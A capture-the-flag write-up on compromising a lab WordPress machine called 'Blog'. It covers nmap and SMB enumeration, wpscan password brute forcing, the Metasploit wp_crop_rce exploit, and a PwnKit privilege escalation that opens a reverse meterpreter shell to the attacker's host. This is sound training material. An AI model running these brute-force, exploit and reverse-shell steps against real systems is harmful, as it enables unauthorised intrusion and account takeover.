# Blog
Billy Joel made a Wordpress blog!

## Resolution

From the name and description of the room, we know that we're dealing with a wordpress application. Nevertheless, we scan for all running services on the machine.

```
$ sudo nmap -sV -sC <machine_ip> -Pn -n --disable-arp-ping

<...snip...>
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: blog.thm, BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-02-24T17:39:32
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2024-02-24T17:39:33+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

```

Exposed services are: an ssh agent, a web app running the wordpress blog, and an SMB server. The information on the running SMB service revealed by the default nmap scripts may be useful in the future.

Examining the blog's home page (mom's note and comments), it looks like Joel is a not experimented with Wordpress and most likely default configurations are still there. Additionally, we know that Wordpress login is vulnerable to brute force attacks.

To validate this idea, we go to the login page (accessible from the "Log in" button in the bottom of the page or alternatively at `http://blog.thm/wp-login.php`). We enter whatever credentials there (e.g. admin admin), the response is an "invalid username" error message.
Notice that when we hover (or click) on a user, we are able to get their username where the redirection link of a user's page is of the form `http://blog.thm/author/<username>`.
The username of Billy Joel is `bjoel`.
Entering the username in the login page confirms the ability to brute force the login.

I tried to brute foce using `hydra` and the rockyou wordlist but it didn't work out so I started thinking of other possibilities.

Let's connect to the SMB server and see if we can get any useful information:
```
# List available shares on the server
$ smbclient -U guest -L <ip_addr>

Password for [WORKGROUP\guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BLOG
```
```
# Connect to BillySMB share
$ smbclient -U guest \\\\BLOG\\BillySMB
   
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 18:17:05 2020
  ..                                  D        0  Tue May 26 17:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 18:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 18:13:45 2020
  check-this.png                      N     3082  Tue May 26 18:13:43 2020

                15413192 blocks of size 1024. 9790352 blocks available
```

There is an interesting file called `check-this.png`, we can download it using the `get` command:
```
smb: \> get check-this.png

getting file \check-this.png of size 3082 as check-this.png (18.2 KiloBytes/sec) (average 18.2 KiloBytes/sec)
```

The picture contais a QR code, which leads to a YouTube music video of Billy Joel (Just discovered this is a name of a famous musician).

Checking the other files might lead somewhere.

```
$ stegseek Alice-White-Rabbit.jpg   
                      
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "rabbit_hole.txt".
[i] Extracting to "Alice-White-Rabbit.jpg.out".

$ cat Alice-White-Rabbit.jpg.out

You've found yourself in a rabbit hole, friend.
```

Nothing useful. Straight into the rabbit hole :/

Back to our wordpress application, I started looking for common vulnerabilities of that specific version and also why `hydra` was giving wrong passwords as a match. Long story short, `hydra` is not always a good option (not in this case), and we shuldn't depend 100% on it. Additionaly, this wordpress version presents a path traversal vulnerability (CVE-2019-8943, CVE-2019-8942) that can be exploited using Metasploit once we have the credentials of a user of at least an author privilege.

We have only two users in the blog. This can be verified by navigating to:
```
http://blog.thm/wp-json/wp/v2/users
```

Let's try and brute force login passwords of bjoel and kwheel but this time using `wpscan` (a wordpress security scanner). We are able to find the password of kwheel:
```
$ wpscan --url blog.thm -P /usr/share/wordlists/rockyou.txt -U "kwheel"

<...snip...>
[+] Performing password attack on Xmlrpc against 1 user/s
Trying kwheel / morgan1 Time: 00:01:03 <                       > (2125 / 14344392)  0.01%  ETA: ??:??:??
[SUCCESS] - kwheel / cutiepie1                                                                
<...snip...>
```

Now we move to metasploit for further exploitation.
```
msf6 > use exploit/multi/http/wp_crop_rce

msf6 exploit(multi/http/wp_crop_rce) > set username kwheel

msf6 exploit(multi/http/wp_crop_rce) > set password cutipie1

msf6 exploit(multi/http/wp_crop_rce) > set rhosts blog.thm

msf6 exploit(multi/http/wp_crop_rce) > set lhost <your_ip>

msf6 exploit(multi/http/wp_crop_rce) > exploit

```

Got access to the machine and now we gotta look for the files.
First thing, we check the users on the machine. We find a `user.txt` file in bjoel home directory, but:
```
meterpreter > cat home/bjoel/user.txt

You won't find what you're looking for here.
TRY HARDER
```

For the user flag, I made use of the hint which is of the format `/*****/***`. There is one unique path of that format on the machine which is `/media/usb`. And this was the right answer.

To Access the content of that folder, we need higher priviliges.

Executing the `linPEAS.sh` script hints about many exploitation vector. I tried exploiting some of them unsuccessfully before what did actually work: **pwnkit**
```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

We send our current session to the background and launch the pwnkit exploit. Now we can access the user flag at `/media/tmp/user.txt` and the root flag at `/root/root.txt`
```
meterpreter > bg
[*] Backgrounding session 1...

msf6 exploit(multi/http/wp_crop_rce) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set session 1
session => 1
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set lhost <your_ip>
lhost => <your_ip>
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run

[*] Started reverse TCP handler on <your_ip>:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.pcogeqgxi
[+] The target is vulnerable.
[*] Writing '/tmp/.tsqqhfteilu/jcilqimaxeqh/jcilqimaxeqh.so' (548 bytes) ...
[!] Verify cleanup of /tmp/.tsqqhfteilu
[*] Sending stage (3045380 bytes) to <machine_ip>
[+] Deleted /tmp/.tsqqhfteilu/jcilqimaxeqh/jcilqimaxeqh.so
[+] Deleted /tmp/.tsqqhfteilu/.wlhjnbz
[+] Deleted /tmp/.tsqqhfteilu
[*] Meterpreter session 2 opened (<your_ip>:4444 -> <machine_ip>:52260) at 2024-02-26 14:09:43 +0000

meterpreter >
```


